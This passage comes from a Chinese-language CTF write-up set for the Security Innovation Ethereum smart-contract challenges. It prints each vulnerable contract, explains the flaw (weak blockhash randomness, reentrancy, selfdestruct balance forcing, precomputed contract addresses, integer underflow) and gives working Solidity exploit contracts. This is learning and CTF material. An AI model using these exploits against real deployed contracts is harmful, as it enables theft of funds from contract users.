\u9884\u6d4b\u4f2a\u968f\u673a\u6570\uff0c\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u7136\u540e\u6839\u636e play \u91cc\u7684\u903b\u8f91\u751f\u6210 target\uff0c\u7136\u540e\u4f20\u7ed9 play \u5373\u53ef \u9700\u8981\u6ce8\u610f\u7684\u662f\u8981\u652f\u4ed8 1 finney \u4f5c\u4e3a value\uff0c\u5e76\u4e14\u5728\u90e8\u7f72\u5408\u7ea6\u4e4b\u540e\u8981\u5148\u8c03\u7528\u4e00\u4e0b Lottery \u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\uff08\u6765\u81ea CtfFramework\uff09\u5c06\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355 exp contract Exploit { Lottery challenge ; constructor ( address addr ) public { challenge = Lottery ( addr ); } function exp () public payable { bytes32 entropy = blockhash ( block.number ); bytes32 entropy2 = keccak256 ( abi . encodePacked ( this )); uint256 ans = uint256 ( entropy ^ entropy2 ); challenge . play . value ( msg.value )( ans ); } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } } Heads or Tails \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract HeadsOrTails is CtfFramework { using SafeMath for uint256 ; uint256 public gameFunds ; uint256 public cost ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { gameFunds = gameFunds . add ( msg.value ); cost = gameFunds . div ( 10 ); } function play ( bool _heads ) external payable ctf { require ( msg.value == cost , \"Incorrect Transaction Value\" ); require ( gameFunds >= cost . div ( 2 ), \"Insufficient Funds in Game Contract\" ); bytes32 entropy = blockhash ( block.number - 1 ); bytes1 coinFlip = entropy [ 0 ] & 1 ; if (( coinFlip == 1 && _heads ) || ( coinFlip == 0 && ! _heads )) { //win gameFunds = gameFunds . sub ( msg.value . div ( 2 )); msg.sender . transfer ( msg.value . mul ( 3 ). div ( 2 )); } else { //loser gameFunds = gameFunds . add ( msg.value ); } } } \u540c\u6837\u662f\u8ba1\u7b97\u4f2a\u968f\u673a\u6570\uff0c\u6bcf\u6b21 play \u9700\u8981 0.1 ether\uff0c\u5e76\u4e14\u4ece\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u8f6c\u51fa 0.05 ether \u4f5c\u4e3a\u5956\u52b1\u3002\u56e0\u6b64\u9700\u8981\u8c03\u7528 20 \u6b21 play \u6765\u8f6c\u51fa\u8d26\u6237\u4e2d\u7684 2 ether \u540c\u6837\u9700\u8981\u5728\u90e8\u7f72\u5408\u7ea6\u540e\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\u6765\u5c06\u653b\u51fb\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355\u3002\u5e76\u4e14\u505a\u5b8c\u4e4b\u540e selfdestruct \u6765\u8f6c\u56de\u653b\u51fb\u5408\u7ea6\u4e2d\u7684 3 ether \u4f1a\u6bd4\u8f83\u597d exp contract Exploit { HeadsOrTails challenge ; constructor ( address addr ) public { challenge = HeadsOrTails ( addr ); } function exp () public payable { bytes32 entropy = blockhash ( block.number - 1 ); bytes1 coinFlip = entropy [ 0 ] & 1 ; for ( int i = 0 ; i < 20 ; i ++ ) { if ( coinFlip == 1 ) { challenge . play . value ( 0 . 1 ether )( true ); } else { challenge . play . value ( 0 . 1 ether )( false ); } } } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } } Trust Fund \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract TrustFund is CtfFramework { using SafeMath for uint256 ; uint256 public allowancePerYear ; uint256 public startDate ; uint256 public numberOfWithdrawls ; bool public withdrewThisYear ; address public custodian ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { custodian = msg.sender ; allowancePerYear = msg.value . div ( 10 ); startDate = now ; } function checkIfYearHasPassed () internal { if ( now >= startDate + numberOfWithdrawls * 365 days ){ withdrewThisYear = false ; } } function withdraw () external ctf { require ( allowancePerYear > 0 , \"No Allowances Allowed\" ); checkIfYearHasPassed (); require ( ! withdrewThisYear , \"Already Withdrew This Year\" ); if ( msg.sender . call . value ( allowancePerYear )()){ withdrewThisYear = true ; numberOfWithdrawls = numberOfWithdrawls . add ( 1 ); } } function returnFunds () external payable ctf { require ( msg.value == allowancePerYear , \"Incorrect Transaction Value\" ); require ( withdrewThisYear == true , \"Cannot Return Funds Before Withdraw\" ); withdrewThisYear = false ; numberOfWithdrawls = numberOfWithdrawls . sub ( 1 ); } } \u91cd\u5165\u653b\u51fb\uff0c\u5199\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5728\u5176 fallback \u4e2d\u518d\u6b21\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\uff0c\u6ce8\u610f\u8981\u5728 MetaMask \u53d1\u9001\u4ea4\u6613\u65f6\u63d0\u9ad8\u4e00\u4e0b gas\uff0c\u4e0d\u7136\u5185\u90e8\u7684\u4ea4\u6613\u4f1a\u51fa\u73b0 gas \u4e0d\u8db3\u7684\u95ee\u9898 exp contract Exploit { TrustFund challenge ; constructor ( address addr ) public { challenge = TrustFund ( addr ); } function exp () public { challenge . withdraw (); } function () public payable { challenge . withdraw (); } function destroy ( address addr ) public { selfdestruct ( addr ); } } Record Label \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Royalties { using SafeMath for uint256 ; address private collectionsContract ; address private artist ; address [] private receiver ; mapping ( address => uint256 ) private receiverToPercentOfProfit ; uint256 private percentRemaining ; uint256 public amountPaid ; constructor ( address _manager , address _artist ) public { collectionsContract = msg.sender ; artist = _artist ; receiver . push ( _manager ); receiverToPercentOfProfit [ _manager ] = 80 ; percentRemaining = 100 - receiverToPercentOfProfit [ _manager ]; } modifier isCollectionsContract () { require ( msg.sender == collectionsContract , \"Unauthorized: Not Collections Contract\" ); _ ; } modifier isArtist (){ require ( msg.sender == artist , \"Unauthorized: Not Artist\" ); _ ; } function addRoyaltyReceiver ( address _receiver , uint256 _percent ) external isArtist { require ( _percent < percentRemaining , \"Precent Requested Must Be Less Than Percent Remaining\" ); receiver . push ( _receiver ); receiverToPercentOfProfit [ _receiver ] = _percent ; percentRemaining = percentRemaining . sub ( _percent ); } function payoutRoyalties () public payable isCollectionsContract { for ( uint256 i = 0 ; i < receiver . length ; i ++ ){ address current = receiver [ i ]; uint256 payout = msg.value . mul ( receiverToPercentOfProfit [ current ]). div ( 100 ); amountPaid = amountPaid . add ( payout ); current . transfer ( payout ); } msg.sender . call . value ( msg.value - amountPaid )( bytes4 ( keccak256 ( \"collectRemainingFunds()\" ))); } function getLastPayoutAmountAndReset () external isCollectionsContract returns ( uint256 ){ uint256 ret = amountPaid ; amountPaid = 0 ; return ret ; } function () public payable isCollectionsContract { payoutRoyalties (); } } contract Manager { address public owner ; constructor ( address _owner ) public { owner = _owner ; } function withdraw ( uint256 _balance ) public { owner . transfer ( _balance ); } function () public payable { // empty } } contract RecordLabel is CtfFramework { using SafeMath for uint256 ; uint256 public funds ; address public royalties ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { royalties = new Royalties ( new Manager ( _ctfLauncher ), _player ); funds = funds . add ( msg.value ); } function () external payable ctf { funds = funds . add ( msg.value ); } function withdrawFundsAndPayRoyalties ( uint256 _withdrawAmount ) external ctf { require ( _withdrawAmount <= funds , \"Insufficient Funds in Contract\" ); funds = funds . sub ( _withdrawAmount ); royalties . call . value ( _withdrawAmount )(); uint256 royaltiesPaid = Royalties ( royalties ). getLastPayoutAmountAndReset (); uint256 artistPayout = _withdrawAmount . sub ( royaltiesPaid ); msg.sender . transfer ( artistPayout ); } function collectRemainingFunds () external payable { require ( msg.sender == royalties , \"Unauthorized: Not Royalties Contract\" ); } } \u5408\u7ea6\u770b\u8d77\u6765\u5f88\u957f\uff0c\u4f46\u662f\u5927\u81f4\u770b\u4e00\u4e0b\u7684\u8bdd\u5c31\u53ef\u4ee5\u770b\u51fa\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u7684\u65f6\u5019\u4f1a\u628a\u5168\u90e8\u7684 _withdrawAmount \u5168\u90e8\u4f20\u7ed9 Royalties\uff0c\u5176\u4e2d\u4f1a\u5c06 80% \u4f20\u7ed9\u6211\u4eec\uff0c\u518d\u628a 20% \u4f20\u56de\u53bb\uff0c\u800c\u8fd9 20% \u53c8\u4f1a\u5728 withdrawFundsAndPayRoyalties \u4e2d\u518d\u4f20\u7ed9\u6211\u4eec\u3002\u6240\u4ee5\u53ea\u9700\u8981\u76f4\u63a5\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u5c06 1 ether \u63d0\u53d6\u51fa\u6765\u5c31\u53ef\u4ee5\u4e86 Slot Machine \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract SlotMachine is CtfFramework { using SafeMath for uint256 ; uint256 public winner ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { winner = 5 ether ; } function () external payable ctf { require ( msg.value == 1 szabo , \"Incorrect Transaction Value\" ); if ( address ( this ). balance >= winner ){ msg.sender . transfer ( address ( this ). balance ); } } } \u76ee\u6807\u662f\u8ba9\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u7684\u4f59\u989d\u4e0d\u5c11\u4e8e 5 ether\uff0c\u800c\u4e14\u5408\u7ea6\u4e2d\u7684 fallback \u51fd\u6570\u53ea\u63a5\u6536 1 szabo \u4f46\u662f\u5982\u679c\u901a\u8fc7\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5269\u4f59\u4f59\u989d\u5168\u90e8\u8f6c\u79fb\u5230\u9898\u76ee\u5408\u7ea6\u4e0a\u7684\u8bdd\u662f\u4e0d\u4f1a\u7ecf\u8fc7 fallback \u51fd\u6570\u7684\uff0c\u6240\u4ee5\u521b\u5efa\u53e6\u4e00\u4e2a\u5408\u7ea6\uff0c\u8f6c\u5165\u4e0d\u5c11\u4e8e 3.5 ether \u7136\u540e\u518d selfdestruct \u5c31\u53ef\u4ee5\u4e86 exp contract Exploit { address challenge ; constructor ( address addr ) public payable { challenge = addr ; } function exp () public { selfdestruct ( challenge ); } } Rainy Day Fund \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract DebugAuthorizer { bool public debugMode ; constructor () public payable { if ( address ( this ). balance == 1 . 337 ether ){ debugMode = true ; } } } contract RainyDayFund is CtfFramework { address public developer ; mapping ( address => bool ) public fundManagerEnabled ; DebugAuthorizer public debugAuthorizer ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development debugAuthorizer = new DebugAuthorizer (); developer = msg.sender ; fundManagerEnabled [ msg.sender ] = true ; } modifier isManager () { require ( fundManagerEnabled [ msg.sender ] || debugAuthorizer . debugMode () || msg.sender == developer , \"Unauthorized: Not a Fund Manager\" ); _ ; } function () external payable ctf { // Anyone can add to the fund } function addFundManager ( address _newManager ) external isManager ctf { fundManagerEnabled [ _newManager ] = true ; } function removeFundManager ( address _previousManager ) external isManager ctf { fundManagerEnabled [ _previousManager ] = false ; } function withdraw () external isManager ctf { msg.sender . transfer ( address ( this ). balance ); } } \u8f6c\u51fa\u6240\u6709\u94b1\u7684\u8bdd\u8981\u8c03\u7528 withdraw \u51fd\u6570\uff0c\u5b83\u5e26\u6709 isManager \u8fd9\u4e2a modifier\uff0c\u800c manager \u6211\u4eec\u6539\u4e0d\u4e86\uff0c\u6240\u4ee5\u601d\u8def\u5728\u4e8e\u5f00\u542f debug mode \u4f46\u662f\u9898\u76ee\u7684 constructor \u4e2d\u4f1a\u521b\u5efa DebugAuthorizer \u5408\u7ea6\u5b9e\u4f8b\u800c\u4e14\u5e76\u4e0d\u5411\u5176\u4e2d\u8f6c\u5165 1.337 ether\uff0c\u4e5f\u5c31\u4e0d\u4f1a\u6253\u5f00 debug mode\uff0c\u540e\u7eed\u518d\u5411\u5176\u4e2d\u8f6c\u8d26\u7684\u8bdd\u4e5f\u4e0d\u4f1a\u6253\u5f00 debug mode\uff08\u56e0\u4e3a\u8fd9\u4e2a\u662f\u5728 constructor \u4e2d\u8d4b\u503c\u7684\uff09 \u6240\u4ee5\u5c31\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u51fa\u4e0b\u4e00\u6b21 developer \u90e8\u7f72\u7684\u9898\u76ee\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u63d0\u524d\u8ba1\u7b97\u51fa\u5176\u521b\u5efa\u7684 DebugAuthorizer \u7684\u5730\u5740\uff0c\u5148\u5411\u5176\u4e2d\u8f6c\u5165 1.337 ether\uff0c\u8fd9\u65f6\u91cd\u542f\u9898\u76ee\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u9898\u76ee\u5408\u7ea6\uff0c\u5176\u4e2d\u521b\u5efa DebugAuthorizer \u65f6\u68c0\u67e5 balance \u53d1\u73b0\u5df2\u7ecf\u6709\u4e86 1.337 ether\uff0c\u4e5f\u5c31\u6253\u5f00\u4e86 debug mode \u53ef\u4ee5\u76f4\u63a5 withdraw \u800c\u63d0\u524d\u8ba1\u7b97\u5408\u7ea6\u5730\u5740\u7684\u65b9\u6cd5\u5c31\u662f\u8fd0\u7528 create \u7684\u539f\u7406\uff0c\u5373\u5916\u90e8\u8d26\u6237\u521b\u5efa\u5408\u7ea6\u6216\u8005\u5728\u5408\u7ea6\u4e2d\u901a\u8fc7 CREATE \u64cd\u4f5c\u7801\u521b\u5efa\u65b0\u5408\u7ea6\u7684\u65f6\u5019\u8ba1\u7b97\u5730\u5740\u7684\u7b97\u6cd5\u662f\uff1a keccak ( rlp . encode ([ deployer , nonce ])) \u5e76\u4e14\u5728\u5408\u7ea6\u5185\u90e8\u901a\u8fc7 CREATE \u521b\u5efa\u65b0\u5408\u7ea6\u7684\u8bdd\uff0cnonce \u5e94\u8be5\u662f 1 \u76ee\u524d\u9700\u8981\u77e5\u9053\u7684\u662f developer\uff08\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff09\u90e8\u7f72\u5f53\u524d\u9898\u76ee\u5408\u7ea6\u65f6\u7684 nonce \u662f\u591a\u5c11\uff08\u77e5\u9053\u4e86\u8fd9\u4e2a\u4e4b\u540e\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u7684 nonce \u5c31\u662f\u5176\u52a0\u4e00\uff09\uff0c\u53ea\u9700\u8981\u679a\u4e3e\u4e00\u4e0b nonce \u8ba1\u7b97\u5730\u5740\u518d\u548c\u5f53\u524d\u9898\u76ee\u5730\u5740\u6bd4\u8f83\u4e00\u4e0b\u5c31\u53ef\u4ee5\u7206\u7834\u51fa\u6765\uff1a import rlp import web3 def calc_address ( deployer , nonce ): return web3 . Web3 . keccak ( rlp . encode ([ deployer , nonce ])) for nonce in range ( 1 , 1000000 ): if calc_address ( 0xeD0D5160c642492b3B482e006F67679F5b6223A2 , nonce ) . hex () . endswith ( \"66318f6b06fd5769fa310732566b13d92cfbc589\" ): print ( nonce ) break \u53ef\u4ee5\u5f97\u5230\u5f53\u524d nonce \u662f 484\uff0c\u6240\u4ee5\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u9898\u76ee\u7684 nonce \u5c31\u662f 485\u3002\u7136\u540e\u63d0\u524d\u8ba1\u7b97\u9898\u76ee\u5730\u5740\u548c DebugAuthorizer \u5730\u5740\uff1a deployer = 0xeD0D5160c642492b3B482e006F67679F5b6223A2 nonce = 485 challenge = int ( calc_address ( deployer , nonce ) . hex ()[ - 40 :], 16 ) print ( f \"next challenge address: { hex ( challenge ) } \" ) debug = int ( calc_address ( challenge , 1 ) . hex ()[ - 40 :], 16 ) print ( f \"next DebugAuthorizer address: { hex ( debug ) } \" ) \"\"\" next challenge address: 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d next DebugAuthorizer address: 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe \"\"\" \u6240\u4ee5\u5148\u5411 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe \u8f6c\u8d26 1.337 ether\uff0c\u518d\u91cd\u7f6e\u9898\u76ee\uff08\u53ef\u4ee5\u9a8c\u8bc1\u4e00\u4e0b\u73b0\u5728\u7684\u9898\u76ee\u5730\u5740\u5c31\u662f 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d\uff09\uff0c\u76f4\u63a5\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u4e86 Raffle \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract Raffle is CtfFramework { uint256 constant fee = 0 . 1 ether ; address private admin ; bytes4 private winningTicket ; uint256 private blocknum ; uint256 public ticketsBought ; bool public raffleStopped ; mapping ( address => uint256 ) private rewards ; mapping ( address => bool ) private potentialWinner ; mapping ( address => bytes4 ) private ticketNumbers ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { rewards [ address ( this )] = msg.value ; admin = msg.sender ; } function buyTicket () external payable ctf { if ( msg.value >= fee ){ winningTicket = bytes4 ( 0 ); blocknum = block.number + 1 ; ticketsBought += 1 ; raffleStopped = false ; rewards [ msg.sender ] += msg.value ; ticketNumbers [ msg.sender ] = bytes4 (( msg.value - fee ) / 10 ** 8 ); potentialWinner [ msg.sender ] = true ; } } function closeRaffle () external ctf { require ( ticketsBought > 0 ); require ( ! raffleStopped ); require ( blocknum != 0 ); require ( winningTicket == bytes4 ( 0 )); require ( block.number > blocknum ); require ( msg.sender == admin || rewards [ msg.sender ] > 0 ); winningTicket = bytes4 ( blockhash ( blocknum )); potentialWinner [ msg.sender ] = false ; raffleStopped = true ; } function collectReward () external payable ctf { require ( raffleStopped ); require ( potentialWinner [ msg.sender ]); rewards [ address ( this )] += msg.value ; if ( winningTicket == ticketNumbers [ msg.sender ]){ msg.sender . transfer ( rewards [ msg.sender ]); msg.sender . transfer ( rewards [ address ( this )]); rewards [ msg.sender ] = 0 ; rewards [ address ( this )] = 0 ; } } function skimALittleOffTheTop ( uint256 _value ) external ctf { require ( msg.sender == admin ); require ( rewards [ address ( this )] > _value ); rewards [ address ( this )] = rewards [ address ( this )] - _value ; msg.sender . transfer ( _value ); } function () public payable ctf { if ( msg.value >= fee ){ this . buyTicket (); } else if ( msg.value == 0 ){ this . closeRaffle (); } else { this . collectReward (); } } } \u662f\u4e00\u4e2a\u62bd\u5956\uff0c\u9700\u8981\u901a\u8fc7 buyTicket \u4e70\u7968\u83b7\u5f97\u8d44\u683c\uff0c\u5e76\u4e14 ticketNumbers \u4e3a (msg.value - fee)/10**8\uff0c\u7ed3\u675f\u62bd\u5956\u9700\u8981\u8c03\u7528 closeRaffle \u51fd\u6570\uff0c\u4f46\u662f\u8fd9\u4e5f\u4f1a\u53d6\u6d88\u62bd\u5956\u8d44\u683c\u3002\u800c\u6700\u540e\u62bd\u4e2d\u7684 ticketNumbers \u4e3a\u6700\u540e\u4e00\u4e2a\u4e70\u7968\u7684 blocknum \u7684 blockhash \u8fd9\u5c31\u6709\u4e86\u4e00\u4e2a\u6f0f\u6d1e\uff0cblockhash \u53ea\u4f1a\u8ba1\u7b97\u6700\u8fd1\u7684 256 \u4e2a\u5757\uff0c\u518d\u65e9\u7684\u7ed3\u679c\u4f1a\u662f 0 \u4f46\u662f\u5982\u679c\u4f7f\u7528\u4e24\u4e2a\u5408\u7ea6\u4e00\u4e2a\u6765\u5173\u95ed\u62bd\u5956\uff0c\u53e6\u4e00\u4e2a\u9886\u5956\u7684\u8bdd\uff0c\u4e0d\u80fd\u53d6\u51fa\u5168\u90e8\u7684\u4f59\u989d\uff08\u56e0\u4e3a\u5173\u95ed\u62bd\u5956\u7684\u8d26\u6237\u4e70\u7968\u7684\u94b1\u4e0d\u4f1a\u8f6c\u51fa\u6765\uff09\u3002\u56e0\u6b64\u9700\u8981\u901a\u8fc7 fallback \u51fd\u6570\uff0cvalue \u4e3a 0 \u7684\u65f6\u5019\u4f1a\u8c03\u7528 closeRaffle\uff0c\u8fd9\u4f1a\u4f7f closeRaffle \u5224\u65ad\u7684 msg.sender \u4e3a\u81ea\u8eab\u3002\u6240\u4ee5\u53ea\u9700\u8981\u4e70\u4e0b\u7968\uff0c\u7136\u540e\u7b49\u5f85\u51fa 256 \u4e2a\u5757\u4e4b\u540e\u89e6\u53d1 fallback \u7136\u540e\u518d collectReward \u5c31\u597d\u4e86 \u8fd9\u91cc\u6ce8\u610f\u8fd8\u8981\u628a\u9898\u76ee\u5408\u7ea6\u5730\u5740\u901a\u8fc7\u8c03\u7528 ctf_challenge_add_authorized_sender \u52a0\u5165\u767d\u540d\u5355\uff0c\u624d\u53ef\u4ee5\u5728 fallback \u4e2d\u8c03\u7528\u81ea\u8eab\u51fd\u6570 exp contract Exploit { Raffle challenge ; constructor ( address addr ) public { challenge = Raffle ( addr ); } function buyTicket () public payable { challenge . buyTicket . value ( msg.value )(); } function exp () public { address ( challenge ). call . value ( 0 ether )(); challenge . collectReward (); } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } } Scratchcard \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; library Address { function isContract ( address account ) internal view returns ( bool ) { uint256 size ; assembly { size : = extcodesize ( account ) } return size > 0 ; } } contract Scratchcard is CtfFramework { event CardPurchased ( address indexed player , uint256 cost , bool winner ); mapping ( address => uint256 ) private winCount ; uint256 private cost ; using Address for address ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { } modifier notContract (){ require ( ! msg.sender . isContract (), \"Contracts Not Allowed\" ); _ ; } function play () public payable notContract ctf { bool won = false ; if (( now % 10 ** 8 ) * 10 ** 10 == msg.value ){ won = true ; winCount [ msg.sender ] += 1 ; cost = msg.value ; msg.sender . transfer ( cost ); } else { cost = 0 ; winCount [ msg.sender ] = 0 ; } emit CardPurchased ( msg.sender , msg.value , won ); } function checkIfMegaJackpotWinner () public view returns ( bool ){ return ( winCount [ msg.sender ] >= 25 ); } function collectMegaJackpot ( uint256 _amount ) public notContract ctf { require ( checkIfMegaJackpotWinner (), \"User Not Winner\" ); require ( 2 * cost - _amount > 0 , \"Winners May Only Withdraw Up To 2x Their Scratchcard Cost\" ); winCount [ msg.sender ] = 0 ; msg.sender . transfer ( _amount ); } function () public payable ctf { play (); } } \u8c03\u7528 play \u6765\u731c\u968f\u673a\u6570\uff0cplay \u51fd\u6570\u6709\u4e00\u4e2a notContract \u7684 modifier\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u5728 constructor \u4e2d\u76f4\u63a5\u64cd\u4f5c\u6765\u7ed5\u8fc7\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u5728\u653b\u51fb\u5408\u7ea6\u4e2d\u8c03\u7528 25 \u6b21 play \u51fd\u6570\u6765\u8fbe\u5230\u6761\u4ef6\uff0c\u8f6c\u51fa\u7684\u65f6\u5019\u867d\u7136\u5224\u65ad\u4e86 2 * cost - _amount > 0 \u4f46\u90fd\u662f uint \u53ef\u4ee5\u4e0b\u6ea2\uff0c\u6240\u4ee5\u76f4\u63a5\u8f6c\u51fa\u5168\u90e8\u5c31\u597d\u4e86 \u53e6\u5916\u8fd8\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u4e00\u4e0b\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u8c03\u7528 ctf_challenge_add_authorized_sender \u51fd\u6570\u9884\u5148\u628a\u8981\u90e8\u7f72\u7684\u653b\u51fb\u5408\u7ea6\u7684\u4f4d\u7f6e\u52a0\u5165\u767d\u540d\u5355\u540e\u624d\u53ef\u4ee5\u90e8\u7f72\u653b\u51fb\u5408\u7ea6 exp contract Attacker { Scratchcard challenge ; uint public count ; uint public money ; constructor ( address addr , address player ) public payable { challenge = Scratchcard ( addr ); count = 0 ; while ( count < 25 ) { money = ( now % 10 ** 8 ) * 10 ** 10 ; challenge . play . value ( money )(); count += 1 ; } challenge . collectMegaJackpot ( addr . balance ); selfdestruct ( player ); } function () public payable {} } contract Exploit { Scratchcard challenge ; address player ; uint8 public nonce ; constructor ( address addr , address _player ) public { challenge = Scratchcard ( addr ); player = _player ; nonce = 1 ; } function exp () public payable { address attacker = address ( keccak256 ( 0xd6 , 0x94 , this , nonce )); nonce += 1 ; challenge . ctf_challenge_add_authorized_sender ( attacker ); address ( attacker ). transfer ( 4 ether ); Attacker newAttacker = new Attacker ( address ( challenge ), player ); } function () public payable {} function destroy () public { selfdestruct ( player ); } }","title":"Security Innovation"},{"location":"writeups/SecurityInnovation/#security-innovation-smart-contract-ctf-writeups","text":"Abstract https://blockchain-ctf.securityinnovation.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55 \u524d\u7f6e\u6b65\u9aa4\uff1a \u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237 \u8fde\u63a5\u5230 Ropsten \u6d4b\u8bd5\u7f51\u7edc \u901a\u8fc7 https://faucet.metamask.io/ \u641e\u70b9\u6d4b\u8bd5\u5e01 \u5728\u7f51\u7ad9\u4e0a\u8fde\u63a5 MetaMask\u3001\u90e8\u7f72\u9898\u76ee","title":"Security Innovation Smart Contract CTF Writeups"},{"location":"writeups/SecurityInnovation/#donation","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Donation is CtfFramework { using SafeMath for uint256 ; uint256 public funds ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { funds = funds . add ( msg.value ); } function () external payable ctf { funds = funds . add ( msg.value ); } function withdrawDonationsFromTheSuckersWhoFellForIt () external ctf { msg.sender . transfer ( funds ); funds = 0 ; } \u76ee\u7684\u662f\u628a\u5408\u7ea6\u8d26\u6237\u641e\u6ca1\u94b1\uff0c\u6240\u4ee5\u5728 Remix \u4e2d\u7f16\u8bd1\u4e0b\u4ee3\u7801\uff0c\u7136\u540e\u4ece\u9898\u76ee\u90e8\u7f72\u7684\u5408\u7ea6\u5730\u5740\u8f7d\u5165\u5408\u7ea6\uff0c\u518d\u8c03\u7528 withdrawDonationsFromTheSuckersWhoFellForIt \u51fd\u6570\u5373\u53ef","title":"Donation"},{"location":"writeups/SecurityInnovation/#lock-box","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract Lockbox1 is CtfFramework { uint256 private pin ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { pin = now % 10000 ; } function unlock ( uint256 _pin ) external ctf { require ( pin == _pin , \"Incorrect PIN\" ); msg.sender . transfer ( address ( this ). balance ); } } \u53ef\u4ee5\u53d1\u73b0\uff0c\u9700\u8981\u8c03\u7528 unlock \u51fd\u6570\uff0c\u5b83\u9700\u8981\u63a5\u6536\u4e00\u4e2a\u6b63\u786e\u7684 pin\uff0c\u8fd9\u4e2a pin \u662f\u4ece\u521b\u5efa\u5408\u7ea6\u7684\u65f6\u95f4\u6233\u8ba1\u7b97\u6765\u7684\uff0c\u53ef\u4ee5\u5728\u94fe\u4e0a\u627e\u5230\u90e8\u7f72\u65f6\u95f4\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 web3 \u8bfb\u53d6\u5408\u7ea6 pin \u4f4d\u7f6e\u7684 storage \u4ece\u800c\u770b\u5230 pin \u5185\u5bb9\uff1a > await web3 . eth . getStorageAt ( \"0x56e06639308e17fd9d948ebaea5b2e4b4beef06e\" , 1 , ( x , y )=>{ console . log ( y );}) 0x0000000000000000000000000000000000000000000000000000000000000f73 \u7136\u540e\u540c\u6837\u5728 Remix \u4e0a\u7f16\u8bd1\u3001\u8f7d\u5165\u518d\u8c03\u7528 unlock \u51fd\u6570\u8f93\u5165\u6b63\u786e\u7684 pin \u5373\u53ef","title":"Lock Box"},{"location":"writeups/SecurityInnovation/#piggy-bank","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract PiggyBank is CtfFramework { using SafeMath for uint256 ; uint256 public piggyBalance ; string public name ; address public owner ; constructor ( address _ctfLauncher , address _player , string _name ) public payable CtfFramework ( _ctfLauncher , _player ) { name = _name ; owner = msg.sender 